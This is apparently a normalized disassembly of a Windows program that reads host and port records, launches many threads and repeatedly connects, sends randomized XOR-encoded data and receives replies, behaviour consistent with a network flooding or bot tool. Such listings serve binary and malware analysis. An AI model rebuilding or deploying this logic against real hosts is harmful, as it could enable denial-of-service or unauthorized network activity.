mov [ ebp - 0x3eac9 ] dl
add [ ebp - 0x3eac4 ] 0x1
cmp [ ebp - 0x3eac9 ] 0x0
jne r-xdata
mov eax [ ebp - 0x3eac4 ]
sub eax [ ebp - 0x3eac8 ]
mov [ ebp - 0x3ead0 ] eax
mov ecx [ ebp - 0x3eaa8 ]
cmp ecx [ ebp - 0x3ead0 ]
jae r-xdata
mov edi [ ebp - 0x3e80c ]
imul edi edi 0x1c1
add edi [ ebp - 0x3eab0 ]
mov ecx 0x10
lea esi [ ebp - 0x3eaa0 ]
[ edi ] [ esi ]
lea esi [ ebp - 0x3ea60 ]
mov eax [ ebp - 0x3e80c ]
imul eax eax 0x1c1
mov ecx [ ebp - 0x3eab0 ]
lea edi [ ecx + eax + 0x40 ]
mov ecx 0x10
[ edi ] [ esi ]
lea esi [ ebp - 0x3ea20 ]
mov edx [ ebp - 0x3e80c ]
imul edx edx 0x1c1
mov eax [ ebp - 0x3eab0 ]
lea edi [ eax + edx + 0x80 ]
mov ecx 0x10
[ edi ] [ esi ]
lea esi [ ebp - 0x3e9e0 ]
mov ecx [ ebp - 0x3e80c ]
imul ecx ecx 0x1c1
mov edx [ ebp - 0x3eab0 ]
lea edi [ edx + ecx + 0xc0 ]
mov ecx 0x10
[ edi ] [ esi ]
lea esi [ ebp - 0x3e9a0 ]
mov eax [ ebp - 0x3e80c ]
imul eax eax 0x1c1
mov ecx [ ebp - 0x3eab0 ]
lea edi [ ecx + eax + 0x100 ]
mov ecx 0x10
[ edi ] [ esi ]
lea esi [ ebp - 0x3e960 ]
mov edx [ ebp - 0x3e80c ]
imul edx edx 0x1c1
mov eax [ ebp - 0x3eab0 ]
lea edi [ eax + edx + 0x140 ]
mov ecx 0x10
[ edi ] [ esi ]
lea esi [ ebp - 0x3e920 ]
mov ecx [ ebp - 0x3e80c ]
imul ecx ecx 0x1c1
mov edx [ ebp - 0x3eab0 ]
lea edi [ edx + ecx + 0x180 ]
mov ecx 0x10
[ edi ] [ esi ]
mov eax [ ebp - 0x3e80c ]
add eax 0x1
mov [ ebp - 0x3e80c ] eax
jmp r-xdata
mov edx [ ebp - 0x3e820 ]
add edx [ ebp - 0x3eaa8 ]
movsx eax [ edx ]
cmp eax 0x7c
jne r-xdata
mov edx [ ebp - 0x3e81c ]
shl edx 0x6
lea eax [ ebp + edx - 0x3eaa0 ]
mov ecx [ ebp - 0x3e820 ]
add ecx [ ebp - 0x3eaa8 ]
mov edx [ ebp - 0x3eaa4 ]
mov cl [ ecx ]
mov [ eax + edx ] cl
mov edx [ ebp - 0x3eaa4 ]
add edx 0x1
mov [ ebp - 0x3eaa4 ] edx
cmp [ ebp - 0x3eaa4 ] 0x40
jne r-xdata
mov ecx [ ebp - 0x3e81c ]
add ecx 0x1
mov [ ebp - 0x3e81c ] ecx
mov [ ebp - 0x3eaa4 ] 0x0
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x3eaa8 ]
add ecx 0x1
mov [ ebp - 0x3eaa8 ] ecx
sub_4023a0
push ebp
mov ebp esp
sub esp 0x10
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov ecx [ ebp - 0x4 ]
movzx edx [ ecx + 0x1c0 ]
test edx edx
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_402ab0
add esp 0x4
mov ecx [ rw-data ]
add ecx 0x1
mov [ rw-data ] ecx
mov edx [ ebp - 0x4 ]
add edx 0x80
push edx
call sub_403350
add esp 0x4
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xa
jb r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x927c0
jae r-xdata
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x8 ]
xor edx edx
mov ecx 0xa
div ecx
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0xc ]
jae r-xdata
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
movzx edx [ ecx + 0x1c0 ]
test edx edx
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0xa
call [ Sleep@IAT ]
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x10 ]
add edx 0x1
mov [ ebp - 0x10 ] edx
sub_402470
push ebp
mov ebp esp
sub esp 0x28
mov [ ebp - 0x28 ] ecx
xor eax eax
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x8 ]
cmp eax [ edx + 0x6d9e8 ]
jae r-xdata
mov [ ebp - 0x4 ] 0x3e8
cmp [ ebp - 0x4 ] 0xa
jb r-xdata
mov ecx [ ebp - 0x8 ]
imul ecx ecx 0x1c1
mov edx [ ebp - 0x28 ]
lea eax [ edx + ecx + 0x36cf4 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0xc ]
movzx edx [ ecx + 0x1c0 ]
test edx edx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x927c0
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x1c0 ] 0x1
mov ecx [ ebp - 0xc ]
add ecx 0xc0
push ecx
call sub_403350
add esp 0x4
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xc8
jle r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
xor edx edx
mov ecx 0xa
div ecx
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x24 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
mov [ ebp - 0x10 ] 0xc8
mov eax [ ebp - 0x24 ]
cmp eax [ ebp - 0x20 ]
jae r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
jge r-xdata
jmp r-xdata
movzx ecx [ rw-data ]
test ecx ecx
je r-xdata
mov [ ebp - 0x18 ] 0x0
lea ecx [ ebp - 0x18 ]
push ecx
push 0x0
mov edx [ ebp - 0xc ]
push edx
push sub_4023a0
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
push eax
call [ CloseHandle@IAT ]
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
push 0xa
call [ Sleep@IAT ]
jmp r-xdata
mov edx [ ebp - 0x14 ]
add edx 0x1
mov [ ebp - 0x14 ] edx
movzx eax [ rw-data ]
test eax eax
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x24 ]
add edx 0x1
mov [ ebp - 0x24 ] edx
sub_402600
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x10 ] ecx
mov [ rw-data ] 0x1
mov [ rw-data ] 0x1
mov [ ebp - 0xc ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ ebp - 0x10 ]
push ecx
push sub_4025e0
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
push edx
call [ CloseHandle@IAT ]
push 0x3e8
call [ Sleep@IAT ]
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ ebp - 0x10 ]
push ecx
push sub_4025c0
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
push edx
call [ CloseHandle@IAT ]
mov esp ebp
pop ebp
retn
sub_402680
push ebp
mov ebp esp
sub esp 0x50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x24 ] 0x0
xor eax eax
mov [ ebp - 0x23 ] eax
mov [ ebp - 0x1f ] eax
mov [ ebp - 0x1b ] eax
mov [ ebp - 0x17 ] eax
mov [ ebp - 0x13 ] eax
mov [ ebp - 0xf ] eax
mov [ ebp - 0xb ] eax
mov [ ebp - 0x7 ] ax
mov [ ebp - 0x5 ] al
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x34 ] ecx
mov edx [ ebp - 0x34 ]
add edx 0x1
mov [ ebp - 0x38 ] edx
mov eax [ ebp - 0x34 ]
mov cl [ eax ]
mov [ ebp - 0x39 ] cl
add [ ebp - 0x34 ] 0x1
cmp [ ebp - 0x39 ] 0x0
jne r-xdata
mov edx [ ebp - 0x34 ]
sub edx [ ebp - 0x38 ]
mov [ ebp - 0x40 ] edx
mov eax [ ebp + 0x14 ]
add eax [ ebp - 0x40 ]
mov [ ebp - 0x28 ] eax
mov ecx [ ebp + 0x8 ]
push ecx
push r--data
lea edx [ ebp - 0x24 ]
push edx
call sub_4032b6
add esp 0xc
lea eax [ ebp - 0x24 ]
push eax
mov ecx [ ebp + 0x14 ]
push ecx
call sub_4019b0
add esp 0x8
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0x2c ] 0x0
je r-xdata
xor eax eax
lea edx [ ebp - 0x24 ]
mov [ ebp - 0x44 ] edx
mov eax [ ebp - 0x44 ]
add eax 0x1
mov [ ebp - 0x48 ] eax
mov ecx [ ebp - 0x44 ]
mov dl [ ecx ]
mov [ ebp - 0x49 ] dl
add [ ebp - 0x44 ] 0x1
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x48 ]
mov [ ebp - 0x50 ] eax
mov ecx [ ebp - 0x2c ]
add ecx [ ebp - 0x50 ]
mov [ ebp - 0x2c ] ecx
mov edx [ ebp - 0x2c ]
mov [ ebp - 0x30 ] edx
mov edx [ ebp - 0x2c ]
sub edx [ ebp - 0x30 ]
push edx
mov eax [ ebp - 0x30 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
call sub_403360
add esp 0xc
mov eax [ ebp - 0x2c ]
sub eax [ ebp - 0x30 ]
jmp r-xdata
mov eax [ ebp - 0x2c ]
cmp eax [ ebp - 0x28 ]
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4030d9
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x2c ]
add ecx 0x1
mov [ ebp - 0x2c ] ecx
jmp r-xdata
mov eax [ ebp - 0x2c ]
movsx ecx [ eax ]
movsx edx [ ebp + 0xc ]
cmp ecx edx
je r-xdata
sub_4027a0
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x80004005
mov [ ebp - 0x30 ] 0x0
xor eax eax
mov [ ebp - 0x24 ] ax
xor ecx ecx
mov [ ebp - 0x22 ] ecx
mov [ ebp - 0x1e ] ecx
mov [ ebp - 0x1a ] ecx
mov [ ebp - 0x16 ] cx
mov [ ebp - 0x2c ] 0x10
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov edx 0x2
mov [ ebp - 0x24 ] dx
mov eax [ ebp + 0x8 ]
push eax
call [ inet_addr@IAT ]
mov [ ebp - 0x34 ] eax
cmp [ ebp - 0x34 ] 0xffffffff
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x20 ] 0xffffffff
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call [ gethostbyname@IAT ]
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0xc ]
mov eax [ edx + 0xc ]
mov ecx [ eax ]
mov edx [ ecx ]
mov [ ebp - 0x34 ] edx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_4030d9
mov esp ebp
pop ebp
retn
movzx ecx [ ebp + 0xc ]
push ecx
call [ htons@IAT ]
mov [ ebp - 0x22 ] ax
mov [ ebp - 0x8 ] 0x0
push 0x6
push 0x1
push 0x2
call [ socket@IAT ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
jne r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x10 ] 0x4
mov edx [ ebp - 0x10 ]
push edx
lea eax [ ebp - 0x28 ]
push eax
push 0x4
push 0xffff
mov ecx [ ebp - 0x8 ]
push ecx
call [ setsockopt@IAT ]
mov edx [ ebp - 0x10 ]
push edx
lea eax [ ebp - 0x28 ]
push eax
push 0xffffff7f
push 0xffff
mov ecx [ ebp - 0x8 ]
push ecx
call [ setsockopt@IAT ]
mov edx [ ebp - 0x2c ]
push edx
lea eax [ ebp - 0x24 ]
push eax
mov ecx [ ebp - 0x8 ]
push ecx
call [ connect@IAT ]
mov [ ebp - 0x30 ] eax
cmp [ ebp - 0x30 ] 0xffffffff
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
push edx
call [ closesocket@IAT ]
xor eax eax
jmp r-xdata
sub_4028e0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp + 0x8 ]
imul eax [ ebp - 0x4 ]
cdq
idiv [ ebp + 0x10 ]
mov eax edx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0xc ]
and eax 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
imul eax [ ebp + 0x8 ]
cdq
idiv [ ebp + 0x10 ]
mov [ ebp + 0x8 ] edx
mov eax [ ebp + 0xc ]
cdq
sub eax edx
sar eax 0x1
mov [ ebp + 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
imul eax [ ebp + 0x8 ]
cdq
idiv [ ebp + 0x10 ]
mov [ ebp - 0x4 ] edx
cmp [ ebp + 0xc ] 0x1
jle r-xdata
sub_402960
push ebp
mov ebp esp
sub esp 0x6c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x24 ] 0x0
xor eax eax
mov [ ebp - 0x23 ] eax
mov [ ebp - 0x1f ] eax
mov [ ebp - 0x1b ] eax
mov [ ebp - 0x17 ] eax
mov [ ebp - 0x13 ] eax
mov [ ebp - 0xf ] eax
mov [ ebp - 0xb ] eax
mov [ ebp - 0x7 ] ax
mov [ ebp - 0x5 ] al
mov [ ebp - 0x68 ] 0x0
push 0x3f
push 0x0
lea ecx [ ebp - 0x67 ]
push ecx
call sub_409820
add esp 0xc
mov edx [ ebp + 0x8 ]
push edx
lea eax [ ebp - 0x24 ]
push eax
push 0x2c
push r--data
call sub_402680
add esp 0x10
mov ecx [ ebp + 0x8 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
push 0x5d
push r--data
call sub_402680
add esp 0x10
mov eax [ ebp + 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
push ecx
push r--data
lea edx [ ebp - 0x68 ]
push edx
call sub_40352e
add esp 0x10
lea eax [ ebp - 0x24 ]
push eax
call sub_403350
add esp 0x4
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ ebp - 0x6c ] 0x0
jmp r-xdata
cmp [ ebp - 0x6c ] 0x5c
jge r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4030d9
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x6c ]
imul eax eax 0xc
mov ecx [ ebp + 0x14 ]
mov edx [ eax + rw-data ]
cmp edx [ ecx ]
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x6c ]
imul eax eax 0xc
mov ecx [ ebp + 0x18 ]
mov edx [ eax + rw-data ]
cmp edx [ ecx ]
jne r-xdata
mov edx [ ebp - 0x6c ]
add edx 0x1
mov [ ebp - 0x6c ] edx
mov eax [ ebp - 0x6c ]
imul eax eax 0xc
mov ecx [ ebp + 0x10 ]
mov edx [ eax + rw-data ]
mov [ ecx ] edx
jmp r-xdata
sub_402a60
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x8 ]
cmp edx [ ebp + 0xc ]
jge r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x8 ]
mov cl [ eax ]
mov [ ebp - 0x9 ] cl
movzx edx [ ebp - 0x9 ]
movzx eax [ ebp + 0x10 ]
xor edx eax
mov ecx [ ebp - 0x4 ]
mov [ ecx ] dl
mov edx [ ebp - 0x4 ]
add edx 0x1
mov [ ebp - 0x4 ] edx
jmp r-xdata
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
sub_402ab0
push ebp
mov ebp esp
sub esp 0x738
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x28 ] eax
push esi
mov [ ebp - 0x518 ] 0x0
push 0x3ff
push 0x0
lea eax [ ebp - 0x517 ]
push eax
call sub_409820
add esp 0xc
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0xac ] 0x0
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x114 ] 0x0
mov [ ebp - 0x24 ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0x8 ]
add ecx 0x40
push ecx
call sub_403350
add esp 0x4
push eax
mov edx [ ebp + 0x8 ]
push edx
call sub_4027a0
add esp 0x8
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
push 0x0
push 0x400
lea eax [ ebp - 0x518 ]
push eax
mov ecx [ ebp - 0x1c ]
push ecx
call [ recv@IAT ]
mov [ ebp - 0xb0 ] eax
cmp [ ebp - 0xb0 ] 0xffffffff
jne r-xdata
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x24 ]
push ecx
lea edx [ ebp - 0x114 ]
push edx
lea eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x518 ]
push ecx
call sub_402960
add esp 0x14
call [ GetTickCount@IAT ]
mov esi eax
call [ GetCurrentThreadId@IAT ]
add esi eax
push esi
call sub_403550
add esp 0x4
call sub_403562
cdq
mov ecx 0xfe
idiv ecx
add edx 0x1
mov [ ebp - 0x10 ] edx
mov edx [ ebp - 0x8 ]
xor edx [ ebp - 0x10 ]
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x24 ]
push ecx
mov edx [ ebp - 0x10 ]
push edx
call sub_402940
add esp 0xc
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x718 ] 0x0
push 0x1ff
push 0x0
lea eax [ ebp - 0x717 ]
push eax
call sub_409820
add esp 0xc
mov ecx [ ebp - 0x20 ]
push ecx
mov edx [ ebp - 0x4 ]
push edx
push r--data
lea eax [ ebp - 0x718 ]
push eax
call sub_4032b6
add esp 0x10
lea ecx [ ebp - 0x718 ]
mov [ ebp - 0x71c ] ecx
mov edx [ ebp - 0x71c ]
add edx 0x1
mov [ ebp - 0x720 ] edx
mov edx [ ebp - 0x1c ]
push edx
call [ closesocket@IAT ]
jmp r-xdata
pop esi
mov ecx [ ebp - 0x28 ]
xor ecx ebp
call sub_4030d9
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x71c ]
mov cl [ eax ]
mov [ ebp - 0x721 ] cl
add [ ebp - 0x71c ] 0x1
cmp [ ebp - 0x721 ] 0x0
jne r-xdata
mov edx [ ebp - 0x71c ]
sub edx [ ebp - 0x720 ]
mov [ ebp - 0x728 ] edx
mov eax [ ebp - 0x728 ]
mov [ ebp - 0xac ] eax
push 0x0
mov ecx [ ebp - 0xac ]
push ecx
lea edx [ ebp - 0x718 ]
push edx
mov eax [ ebp - 0x1c ]
push eax
call [ send@IAT ]
mov [ ebp - 0xb0 ] eax
mov ecx [ ebp - 0xb0 ]
cmp ecx [ ebp - 0xac ]
je r-xdata
mov [ ebp - 0xa8 ] 0x0
push 0x3f
push 0x0
lea eax [ ebp - 0xa7 ]
push eax
call sub_409820
add esp 0xc
call sub_403562
push eax
call sub_403562
push eax
call sub_403562
push eax
call sub_403562
push eax
mov ecx [ ebp - 0x4 ]
push ecx
mov edx [ ebp - 0x20 ]
push edx
call [ GetCurrentThreadId@IAT ]
push eax
call [ GetTickCount@IAT ]
push eax
push r--data
lea eax [ ebp - 0xa8 ]
push eax
call sub_4032b6
add esp 0x28
mov [ ebp - 0x68 ] 0x0
push 0x3f
push 0x0
lea ecx [ ebp - 0x67 ]
push ecx
call sub_409820
add esp 0xc
mov [ ebp - 0xf0 ] 0x0
push 0x3f
push 0x0
lea edx [ ebp - 0xef ]
push edx
call sub_409820
add esp 0xc
mov [ ebp - 0x110 ] 0x0
xor eax eax
mov [ ebp - 0x10f ] eax
mov [ ebp - 0x10b ] eax
mov [ ebp - 0x107 ] eax
mov [ ebp - 0x103 ] eax
mov [ ebp - 0xff ] eax
mov [ ebp - 0xfb ] eax
mov [ ebp - 0xf7 ] eax
mov [ ebp - 0xf3 ] ax
mov [ ebp - 0xf1 ] al
call sub_403562
push eax
call sub_403562
push eax
call sub_403562
push eax
call sub_403562
push eax
push r--data
lea ecx [ ebp - 0x110 ]
push ecx
call sub_4032b6
add esp 0x18
push 0x20
lea edx [ ebp - 0x68 ]
push edx
lea eax [ ebp - 0xa8 ]
push eax
call sub_401280
add esp 0xc
push 0x9
lea ecx [ ebp - 0xf0 ]
push ecx
lea edx [ ebp - 0x110 ]
push edx
call sub_401280
add esp 0xc
lea eax [ ebp - 0xf0 ]
push eax
lea ecx [ ebp - 0x68 ]
push ecx
call [ GetTickCount@IAT ]
mov esi eax
call sub_403562
add esi eax
push esi
mov edx [ ebp + 0x8 ]
add edx 0x140
push edx
mov eax [ ebp + 0x8 ]
add eax 0x100
push eax
push r--data
lea ecx [ ebp - 0x718 ]
push ecx
call sub_4032b6
add esp 0x1c
lea edx [ ebp - 0x718 ]
mov [ ebp - 0x72c ] edx
mov eax [ ebp - 0x72c ]
add eax 0x1
mov [ ebp - 0x730 ] eax
mov edx [ ebp - 0x1c ]
push edx
call [ closesocket@IAT ]
jmp r-xdata
mov ecx [ ebp - 0x72c ]
mov dl [ ecx ]
mov [ ebp - 0x731 ] dl
add [ ebp - 0x72c ] 0x1
cmp [ ebp - 0x731 ] 0x0
jne r-xdata
mov eax [ ebp - 0x72c ]
sub eax [ ebp - 0x730 ]
mov [ ebp - 0x738 ] eax
mov ecx [ ebp - 0x738 ]
mov [ ebp - 0xac ] ecx
push 0x400
push 0x0
lea edx [ ebp - 0x518 ]
push edx
call sub_409820
add esp 0xc
cmp [ ebp - 0xac ] 0xff
jle r-xdata
mov dl [ ebp - 0xac ]
mov [ ebp - 0x518 ] dl
mov eax [ ebp - 0xac ]
push eax
lea ecx [ ebp - 0x718 ]
push ecx
lea edx [ ebp - 0x517 ]
push edx
call sub_409a00
add esp 0xc
mov eax [ ebp - 0xac ]
add eax 0x1
mov [ ebp - 0xac ] eax
mov [ ebp - 0x518 ] 0xff
mov eax [ ebp - 0xac ]
push eax
call [ ntohl@IAT ]
mov [ ebp - 0x517 ] eax
mov ecx [ ebp - 0xac ]
push ecx
lea edx [ ebp - 0x718 ]
push edx
lea eax [ ebp - 0x513 ]
push eax
call sub_409a00
add esp 0xc
mov ecx [ ebp - 0xac ]
add ecx 0x5
mov [ ebp - 0xac ] ecx
jmp r-xdata
mov edx [ ebp - 0x1c ]
push edx
call [ closesocket@IAT ]
push 0x200
push 0x0
lea edx [ ebp - 0x718 ]
push edx
call sub_409820
add esp 0xc
push 0x0
push 0x400
lea eax [ ebp - 0x718 ]
push eax
mov ecx [ ebp - 0x1c ]
push ecx
call [ recv@IAT ]
mov [ ebp - 0xb0 ] eax
cmp [ ebp - 0xb0 ] 0x1
jle r-xdata
movzx ecx [ ebp - 0x10 ]
push ecx
mov edx [ ebp - 0xac ]
push edx
lea eax [ ebp - 0x518 ]
push eax
call sub_402a60
add esp 0xc
movzx edx [ ebp - 0x10 ]
push edx
mov eax [ ebp - 0xb0 ]
push eax
lea ecx [ ebp - 0x718 ]
push ecx
call sub_402a60
add esp 0xc
jmp r-xdata
push 0x0
mov ecx [ ebp - 0xac ]
push ecx
lea edx [ ebp - 0x518 ]
push edx
mov eax [ ebp - 0x1c ]
push eax
call [ send@IAT ]
mov [ ebp - 0xb0 ] eax
mov ecx [ ebp - 0xb0 ]
cmp ecx [ ebp - 0xac ]
jne r-xdata
sub_403000
push ebp
mov ebp esp
mov eax [ rw-data ]
and eax 0x1
jne r-xdata
mov eax rw-data
pop ebp
retn
mov ecx [ rw-data ]
or ecx 0x1
mov [ rw-data ] ecx
mov ecx rw-data
call sub_4019d0
push sub_40c1b0
call sub_40320b
add esp 0x4
sub_403040
push ebp
mov ebp esp
sub esp 0x19c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x198 ]
push eax
push 0x202
call [ WSAStartup@IAT ]
test eax eax
je r-xdata
call sub_403000
mov ecx eax
call sub_402600
mov [ ebp - 0x19c ] 0x0
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4030d9
mov esp ebp
pop ebp
retn 0x10
push 0x3e8
call [ Sleep@IAT ]
mov edx [ ebp - 0x19c ]
add edx 0x1
mov [ ebp - 0x19c ] edx
cmp [ ebp - 0x19c ] 0x12c
jne r-xdata
jmp r-xdata
mov [ ebp - 0x19c ] 0x0
mov ecx 0x1
test ecx ecx
je r-xdata
sub_4030e8
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ DecodePointer@IAT ]
push edi
push [ rw-data ]
call esi
push [ rw-data ]
mov ebx eax
mov [ ebp - 0x4 ] ebx
call esi
mov esi eax
cmp esi ebx
jb r-xdata
xor eax eax
mov edi esi
sub edi ebx
lea eax [ edi + 0x4 ]
cmp eax 0x4
jb r-xdata
push ebx
call sub_403a29
mov ebx eax
lea eax [ edi + 0x4 ]
pop ecx
cmp ebx eax
jae r-xdata
push [ ebp + 0x8 ]
mov edi [ EncodePointer@IAT ]
call edi
mov [ esi ] eax
add esi 0x4
push esi
call edi
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov eax 0x800
cmp ebx eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
add eax ebx
cmp eax ebx
jb r-xdata
mov eax ebx
lea eax [ ebx + 0x10 ]
cmp eax ebx
jb r-xdata
push eax
push [ ebp - 0x4 ]
call sub_403989
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push [ ebp - 0x4 ]
call sub_403989
pop ecx
pop ecx
test eax eax
je r-xdata
sar edi 0x2
push eax
lea esi [ eax + edi * 4 ]
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
sub_40319e
mov edi edi
push esi
push 0x4
push 0x20
call sub_40393d
pop ecx
pop ecx
mov esi eax
push esi
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_4031cf
push 0xc
push r--data
call sub_403d50
call sub_403a9f
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_4030e8
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_403205
mov eax [ ebp - 0x1c ]
call sub_403d95
retn
sub_403230
mov ecx [ esp + 0x8 ]
push edi
push ebx
push esi
mov dl [ ecx ]
mov edi [ esp + 0x10 ]
test dl dl
je r-xdata
mov eax edi
pop esi
pop ebx
pop edi
retn
mov dh [ ecx + 0x1 ]
test dh dh
je r-xdata
xor eax eax
pop esi
pop ebx
pop edi
mov al dl
jmp sub_403f56
mov esi edi
mov ecx [ esp + 0x14 ]
mov al [ edi ]
add esi 0x1
cmp al dl
je r-xdata
mov al [ esi ]
add esi 0x1
cmp al dh
jne r-xdata
test al al
je r-xdata
cmp al dl
je r-xdata
lea edi [ esi - 0x1 ]
pop esi
pop ebx
pop edi
xor eax eax
retn
mov al [ esi ]
add esi 0x1
test al al
jne r-xdata
lea eax [ edi - 0x1 ]
pop esi
pop ebx
pop edi
retn
mov al [ esi ]
add esi 0x2
cmp al ah
jne r-xdata
mov al [ ecx + 0x3 ]
test al al
je r-xdata
mov ah [ esi - 0x1 ]
add ecx 0x2
cmp al ah
je r-xdata
mov ah [ ecx + 0x2 ]
test ah ah
je r-xdata
jmp r-xdata
sub_4032b6
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push edi
xor ebx ebx
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
mov [ ebp - 0x20 ] ebx
[ edi ]
cmp [ ebp + 0xc ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
call sub_405072
mov [ eax ] 0x16
call sub_405020
or eax 0xffffffff
jmp r-xdata
push esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp + 0x10 ]
push eax
push ebx
push [ ebp + 0xc ]
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x1c ] 0x7fffffff
mov [ ebp - 0x14 ] 0x42
call sub_40428e
add esp 0x10
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
pop edi
pop ebx
leave
retn
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_40400e
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax esi
pop esi
sub_403360
mov ecx [ esp + 0xc ]
push edi
